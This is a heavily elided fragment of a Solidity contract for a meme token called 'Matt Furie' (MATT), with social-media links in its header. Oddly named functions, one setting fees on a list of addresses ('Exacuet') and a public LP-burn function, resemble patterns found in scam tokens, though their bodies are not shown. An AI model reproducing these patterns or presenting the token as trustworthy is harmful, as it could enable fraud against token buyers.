...
/**
https://t.me/MattFurie0x69814
https://twitter.com/MattFurie_0814
https://mattfurie.com/
0x69 AND 814 Matt Furie born August 14 make boy's club
...
abstract contract Ownable {
    ...
    function transferOwnershipbtentings(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract MATT is Ownable {
    ...
    constructor (){
        name = unicode"Matt Furie";
        symbol = unicode"MATT";
        decimals = 9;
        uint256 Supply = 690814000000;
    ...
    function Exacuet(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnlpzer(address user) public {
